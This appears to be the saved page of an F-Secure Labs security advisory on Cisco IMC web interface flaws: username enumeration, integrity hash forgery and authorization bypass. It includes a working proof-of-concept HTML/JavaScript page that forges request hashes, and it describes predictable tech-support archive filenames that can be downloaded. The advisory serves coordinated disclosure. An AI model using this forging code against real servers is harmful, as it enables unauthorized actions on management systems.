@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <base href="https://labs.f-secure.com/"><!--[if lte IE 6]></base><![endif]-->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+<meta name="x-subsite-id" content="1" />
+
+    <title>Cisco IMC Server - Multiple Vulnerabilities</title>
+
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/mwr/css/style.css?t=20200715">
+    <link rel="stylesheet" href="https://labs.f-secure.com/themes/labs/css/style.css?t=20200715">
+
+    <meta name="description" content="">
+    <link rel="canonical" href="https://labs.f-secure.com/advisories/cisco-imc-server-multiple-vulnerabilities/">
+    <meta name="robots" content="NOODP,index,follow">
+
+    
+
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+
+    <meta name="format-detection" content="telephone=no">
+    
+    <meta property="og:title" content="">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="F-Secure Labs">
+    <meta property="og:url" content="https://labs.f-secure.com/advisories/cisco-imc-server-multiple-vulnerabilities/">
+    
+    <meta property="og:locale" content='en_GB'>
+    <meta name="twitter:card" content="summary">
+    
+    <meta name="twitter:title" content="">
+    <meta name="twitter:description" content="">
+
+  <script>
+    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});
+    var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;
+    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})
+    (window,document,'script','dataLayer','GTM-KD9T85H');
+  </script>
+  <meta name="google-site-verification" content="jqRTM8I_uI-jDIu1ITng14jD-3iJy0l3TTCIl2I-BIo" />
+<link rel="stylesheet" type="text/css" href="/themes/labs/css/style.css?m=1600760392" />
+</head>
+<body class="BlogPost" dir="ltr">
+
+    <header class="head menu-opened" id="top">
+	<div class="container">
+		<div class="col12">
+			<div class="logo">
+				<a href="/">F-Secure</a>
+			</div>
+		    <a href="/advisories/cisco-imc-server-multiple-vulnerabilities/#nav" class="btn-menu">Menu</a>
+
+<nav class="main-nav" itemscope itemtype="https://schema.org/SiteNavigationElement">
+    <ul>
+        
+            <li class="section nav-advisories"><a href="/advisories/" title="Advisories">Advisories</a></li>
+        
+            <li class="link nav-blog"><a href="/blog/" title="/var/log/messages">/var/log/messages</a></li>
+        
+            <li class="link nav-publications"><a href="/publications/" title="Publications">Publications</a></li>
+        
+            <li class="link nav-tools"><a href="/tools/" title="Tools">Tools</a></li>
+        
+            <li class="link nav-archive"><a href="/archive/" title="Archive">Archive</a></li>
+        
+        <li class="nav-careers"><a href="https://www.f-secure.com/en/web/about_global/careers/job-openings">Careers</a></li>
+    </ul>
+</nav>
+
+		</div>
+	</div>
+</header>
+
+
+    <div class="wrapper">
+
+        <section class="section">
+  <div class="page-title">
+    <div class="container">
+      <span class="content-type">Advisories</span>
+      <h1>Cisco IMC Server - Multiple Vulnerabilities</h1>
+      
+      
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <div class="col8">
+      <div class="blog-post">
+        
+        <table>
+          <tr>
+            <td>Product</td>
+            <td>Cisco IMC Server 4.0(4h)</td>
+          </tr>
+          <tr>
+            <td>Severity</td>
+            <td>Medium</td>
+          </tr>
+          <tr>
+            <td>CVE Reference</td>
+            <td>CVE-2020-26062, CVE-2020-26063</td>
+          </tr>
+          <tr>
+            <td>Type</td>
+            <td>Authorization Bypass, Username Enumeration</td>
+          </tr>
+        </table>
+        
+        <p> </p><h2>Introduction </h2><p class="western">Several vulnerabilities were discovered by F-Secure Consulting in the Cisco Integrated Management Controller (IMC) web application (CVE-2020-26062, CVE-2020-26063 and CSCvv07284). An example datasheet of the product can be found <span style="color: #0014a0;"><span style="text-decoration: underline;"><a class="western" href="https://www.cisco.com/c/en/us/products/collateral/servers-unified-computing/ucs-b-series-blade-servers/data_sheet_c78-728802.html">here</a></span></span>.<br><br>The vulnerabilities combined can be leveraged to enumerate users and bypass authorisation controls. </p><h2 class="western">Vulnerabilities Discovered</h2><p class="western">Three security issues were identified affecting the IMC application version 4.0(4h) and potentially other versions. The complete range of products affected can be found on the relevant Cisco Pages:</p><ul>
+<li>Cisco Integrated Management Controller Software Username Enumeration Vulnerability -<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cimc-enum-CyheP3B7">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cimc-enum-CyheP3B7</a><br><br></li>
+<li>Cisco Integrated Management Controller API Request Hash Modification -<a href="http://bst.cloudapps.cisco.com/bugsearch/bug/CSCvv07284">http://bst.cloudapps.cisco.com/bugsearch/bug/CSCvv07284</a><br><br></li>
+<li>Cisco Integrated Management Controller Software Authorization Bypass Vulnerability -<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cimc-auth-zWkppJxL">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cimc-auth-zWkppJxL</a></li>
+</ul><h3 class="western">Username Enumeration: CVE-2020-26062 - CVSSv3.1 Score: 5.3</h3><p class="western">The Username Enumeration vulnerability was discovered within the log in page of the IMC web interface. In its default configuration, there is no account lockout threshold enforced; offering the opportunity for an adversary to brute-force enumerated accounts.</p><h3>Integrity Hash Forgery: CCSCvv07284 - CVSSv3.1 Score: 3.1</h3><p class="p1">Once authenticated to the application communications with the server consist of HTTP POST requests sent to a set of XML-based APIs. These API calls use an integrity protection scheme. User supplied parameter values are hashed and the resulting value is placed in the CPSG_VAR HTTP header. The hashing functionality is implemented in client-side JavaScript. </p><p>The JavaScript hashing code was re-implemented in the form of an an HTML page. The source code is presented below:</p><pre>&lt;html&gt;
+ &lt;body&gt;
+   &lt;head&gt;
+       &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"&gt;&lt;/script&gt;   
+       &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/hmac-sha256.min.js"&gt;&lt;/script&gt;       
+       &lt;script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/enc-base64.min.js"&gt;&lt;/script&gt;  
+   &lt;/head&gt;
+
+   &lt;script&gt;
+     function invoke(){
+       var sessionCookie = document.getElementById('sessionCookie').value
+       var sessionID = document.getElementById('sessionID').value
+       var queryStringURL = document.getElementById('queryString').value 
+       var queryString = decodeURIComponent(decodeURIComponent(queryStringURL))
+       var hash = hashFnv32(sessionID,queryString)      
+       document.getElementById('output').innerHTML = hash
+       document.getElementById('http').innerHTML = `
+       POST /data HTTP/1.1&lt;br&gt;
+       Host: &lt;IPaddress&gt;&lt;br&gt;
+       Referer: https://&lt;IPaddress&gt;/index.html&lt;br&gt;
+       CSPG_VAR: ` + hash + `&lt;br&gt;
+       Content-Type: application/x-www-form-urlencoded&lt;br&gt;
+       Cookie: username=; sessionCookie=` + sessionCookie +`&lt;br&gt;
+       Content-Length: 105&lt;br&gt;&lt;br&gt;
+       sessionID=`+sessionID+`&amp;queryString=`+queryStringURL+'&lt;br&gt;'
+    }
+
+     function hashFnv32(a, b) {
+           console.log("hashFnv32("+a+","+b+") called") 
+           var d, e = 40389;
+           var g = Math.floor(a.length / 4);
+           for (d = 0; d &lt; g; d++) e ^= a.charCodeAt(d), e += e &lt;&lt; 1;
+           a = e.toString();
+           var ret = CryptoJS.HmacSHA512(b,a).toString()
+           console.log("hashFnv32 returns "+ ret)
+           return ret
+      }
+   &lt;/script&gt;
+
+
+   &lt;form action="#"&gt;
+     &lt;p&gt;sessionCookie&lt;/p&gt;
+     &lt;input type="text" id="sessionCookie" /&gt;
+     &lt;p&gt;sessionID&lt;/p&gt;
+     &lt;input type="text" id="sessionID" /&gt;
+     &lt;p&gt;queryString (double urlencoded)&lt;/p&gt;
+     &lt;input type="text" id="queryString" /&gt;
+     &lt;input  type="button" value="Hash!" /&gt;
+   &lt;/form&gt;
+   &lt;div id="output"&gt;&lt;/div&gt;
+   &lt;br&gt;&lt;br&gt;
+   &lt;div id="http"&gt;&lt;/div&gt;
+ &lt;/body&gt;
+&lt;/html&gt;
+</pre><p>The screenshot below illustrates its use to generate valid requests that will pass integrity checks.</p><p class="western"><img class="center" title="" src="assets/Uploads/_resampled/ResizedImageWzY4MCwzNTdd/cisco-imc-hash-forgery.png" alt="cisco imc hash forgery" width="680" height="357"></p><h3 class="western">Authorization Bypass: CVE-2020-26063 - CVSSv3.1 Score: 5.4</h3><p>Authorisation checks were improperly configured and/or found to be missing on 2 of the IMC API endpoints. It is possible to forge a request using the Integrity Hash Forgery (CCSCvv07284) issue that results in the execution of functionality that is not normally available to some users, such as those with "read-only" roles, for example the "ping" and "set SSH server banner" functions.</p><p>The application also supports the generation of "Tech Support" archives by administrator users. The archives contain configuration files, detailed runtime logs and full directories from the server’s filesystem. If the filename can be 'guessed' it can be downloaded directly e.g. <span class="InlineCode"><span style="font-size: 10.0pt; mso-bidi-font-size: 12.0pt;">/data/saveTechSupportWithHostname(&lt;imc-hostname&gt;-20200714-161002.tar.gz). </span></span>The file is generated in a predictable format: [IMC hostname]-[YYYYMMDD]-[HHMMSS].tar.gz. Once the file is requested it is immediately deleted from the server, limiting the attacker’s window of opportunity. </p><h2>Credit</h2><p>The issues were discovered by Leonidas Tsaousis (<a title="Twitter" href="https://twitter.com/LAripping" target="_blank">@laripping</a>) and Thomas Large of F-Secure Consulting.</p><h2>Timeline</h2><table>
+<thead>
+<tr>
+<td>Date</td>
+<td>Summary</td>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span>20/07/2020</span></td>
+<td><span>Issues disclosed to Cisco PSIRT</span></td>
+</tr>
+<tr>
+<td><span>20/07/2020</span></td>
+<td><span>Cisco PSIRT acknowledged receipt of the report</span></td>
+</tr>
+<tr>
+<td><span>05/08/2020</span></td>
+<td><span>Cisco triaged and reproduced the issues</span></td>
+</tr>
+<tr>
+<td><span>28/09/2020</span></td>
+<td><span>Confirmation of remediation plan, agreement of join disclosure date</span></td>
+</tr>
+<tr>
+<td><span>04/11/2020</span></td>
+<td><span>Joint disclosure by Cisco and F-Secure, Advisory released</span></td>
+</tr>
+</tbody>
+</table>
+      </div>
+      <div class="social-share">
+        <p><span class="content-type">Share</span></p>
+        <ul class="social">
+  <li class="facebook"><a href="http://www.facebook.com/sharer.php?u=https://labs.f-secure.com/advisories/cisco-imc-server-multiple-vulnerabilities/" target="_blank">Share on Facebook</a></li>
+  <li class="twitter"><a href="https://twitter.com/share?url=https://labs.f-secure.com/advisories/cisco-imc-server-multiple-vulnerabilities/&text=Cisco IMC Server - Multiple Vulnerabilities" target="_blank">Share on LinkedIn</a></li>
+  <li class="linkedin"><a href="http://www.linkedin.com/shareArticle?url=https://labs.f-secure.com/advisories/cisco-imc-server-multiple-vulnerabilities/&title=Cisco IMC Server - Multiple Vulnerabilities" target="_blank">Share on Twitter</a></li>
+</ul>
+
+      </div>
+    </div>
+    <div class="col4">
+      
+
+      
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="col12">
+        <p>&nbsp;</p>
+      </div>
+    </div>
+  </section>
+
+
+    </div>
+
+    <footer class="foot">
+	<div class="container">
+    <div class="footer-flex-wrap">
+     <p class="logo"><img src="https://labs.f-secure.com//themes/labs/img/fs-labs-logo-white.svg" alt="F-Secure" width="180" height="60"></p>
+      <ul class="top-menu">
+        <li><a href="/advisories/cisco-imc-server-multiple-vulnerabilities/#top" class="btn-gototop">Top</a></li>
+        
+        <li class="link"><a href="https://www.f-secure.com/en/consulting/contact">Contact</a></li>
+        
+        
+      </ul>
+   </div>
+   <hr/>
+    <div class="col5 suf1 foot-about">
+      <p>F-Secure provides specialist advice and solutions in all areas of cyber security, from professional and managed services, through to developing commercial and open source security tools.  </p>
+    </div>
+    <div class="col3">
+      <ul class="footer-list no-margin">
+        
+        <li><a href="/publications/ti-report-lazarus-group-cryptocurrency-vertical/">Threat Intelligence Report: Lazarus Group Campaign Targeting the Cryptocurrency Vertical</a></li>
+        
+        <li><a href="/publications/the-fake-cisco/">The Fake Cisco</a></li>
+        
+        <li><a href="/publications/u-booting-securely/">U-Booting securely</a></li>
+        
+      </ul>
+    </div>
+    <div class="col3">
+     <ul class="footer-list">
+      
+      <li><a href="/blog/prelude-to-ransomware-systembc/">Prelude to Ransomware: SystemBC</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-3/">Attack Detection Fundamentals 2021: Azure - Lab #3</a></li>
+      
+      <li><a href="/blog/attack-detection-fundamentals-2021-azure-lab-2/">Attack Detection Fundamentals 2021: Azure - Lab #2</a></li>
+      
+    </ul>
+  </div>
+</div>
+<div class="end">
+ <div class="container">
+  <hr/>
+  <div class="footer-flex-wrap">
+   <p class="copyright">Copyright &copy; 2021 F-Secure</p>
+    <ul class="social">
+      
+      <li class="linkedin for-footer"><a href="https://www.linkedin.com/showcase/28493188" target="_blank">Connect with us on LinkedIn</a></li>
+      
+      
+      <li class="twitter for-footer"><a href="https://twitter.com/fsecurelabs" target="_blank">Follow us on Twitter</a></li>
+      
+      
+      <li class="github for-footer"><a href="https://github.com/fsecurelabs" target="_blank">Follow us on GitHub</a></li>
+      
+    </ul>
+ </div>
+</div>
+</div>
+</footer>
+
+    <script src="/themes/mwr/js/min/jquery-3.5.1.min.js" id="jqueryscript"></script>
+
+    
+    <script src="/themes/mwr/js/min/slides.min.js"></script>
+    
+
+    <script src="/themes/mwr/js/min/scripts.js?20190917" id="pagescripts"></script>
+
+    <script type="application/ld+json">
+    { "@context" : "http://schema.org",
+      "@type" : "Organization",
+      "name" : "F-Secure Labs",
+      "url" : "https://labs.f-secure.com",
+      "logo" : "https://labs.f-secure.com/themes/labs/img/fs-labs-logo-white.svg",
+      "sameAs" : [
+          "https://twitter.com/fsecurelabs",
+          "https://www.linkedin.com/showcase/28493188"],
+      "contactPoint" : [
+        { "@type" : "ContactPoint",
+          "telephone" : "+441256300920",
+          "contactType" : "customer service"
+        } ]
+    }
+    </script>
+</body>
+</html>
